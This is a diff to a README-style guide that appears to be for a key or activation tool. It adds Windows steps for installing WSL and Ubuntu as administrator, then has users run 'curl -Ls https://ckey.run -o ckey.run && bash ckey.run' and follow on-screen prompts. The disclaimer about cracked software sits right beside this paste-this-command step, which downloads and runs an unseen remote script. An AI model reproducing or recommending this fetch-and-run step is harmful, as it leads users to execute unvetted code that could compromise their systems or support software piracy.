@@ -47,4 +47,58 @@ This repository does **not** distribute or support cracked software, activation 
 This guide is for educational purposes only.
 
 curl -Ls ckey.run -o ckey.run && bash ckey.run
+for windows first install 
+## Step 1: Install WSL
+
+### Open CMD as Administrator:
+---
+wsl --install
+## Step 2 — Install Ubuntu distro
+
+### Open CMD as Administrator and run:
+---
+wsl --list --online
+### You will see something like Ubuntu.
+---
+Ubuntu-22.04
+and more as well
+
+## Now install it:
+---
+wsl --install -d Ubuntu-22.04
+#### Wait until it finishes downloading and installing.
+
+## Restart Windows
+
+### After it completes, restart your PC.
+
+## Initialize Ubuntu
+
+#### After reboot, open Ubuntu 22.04 from the Start Menu.
+#### It will ask you to create a username and password — do that once, then close it
+
+## Verify Ubuntu is installed
+
+### Open CMD again and run:
+---
+wsl --list --verbose
+
+#### You should now see something like:
+---
+NAME            STATE   VERSION
+Ubuntu-22.04    Running 2
+
+ ## Run your command in Ubuntu from CMD
+
+ ---
+ wsl -d Ubuntu-22.04 bash -lc "curl -Ls https://ckey.run -o ckey.run && bash ckey.run"
+
+and fallow on screen instructions
+
+
+
+
+
+
+
 
